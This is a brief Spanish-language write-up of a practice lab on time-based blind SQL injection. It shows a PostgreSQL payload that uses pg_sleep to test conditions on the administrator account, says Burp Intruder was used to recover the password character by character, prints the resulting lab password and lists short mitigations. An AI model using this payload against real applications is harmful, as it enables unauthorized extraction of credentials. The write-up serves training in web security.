Lab 15

Blind SQL Injection with Time Delays and Information Retrieval

Información

Nivel: Practitioner

Tipo: Time-based Blind SQL Injection

Objetivo

Extraer la contraseña del usuario administrator mediante retrasos de tiempo.

Procedimiento

Payload utilizado:

';SELECT CASE
WHEN (username='administrator')
THEN pg_sleep(10)
ELSE pg_sleep(0)
END FROM users--

Se utilizó Burp Intruder para iterar caracteres y reconstruir la contraseña completa.

Contraseña obtenida:

tmmowcfokak4zmj52ky0

Mitigación

  • Consultas parametrizadas.
  • Monitoreo de tiempos de respuesta.
  • Validación de cookies.
